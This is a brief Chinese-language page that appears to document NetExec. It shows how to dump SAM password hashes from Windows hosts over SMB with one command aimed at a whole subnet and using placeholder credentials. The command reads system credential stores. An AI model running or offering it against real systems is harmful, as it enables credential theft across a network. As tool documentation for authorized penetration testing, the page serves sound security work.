# 导出 SAM

### 使用 secretsdump.py 中的方法导出 SAM 哈希

{% hint style="warning" %}
你需要在远程目标上至少具有本地管理员权限，如果你的用户是本地账户，请使用 **--local-auth** 选项
{% endhint %}

```
#~ nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --sam
```
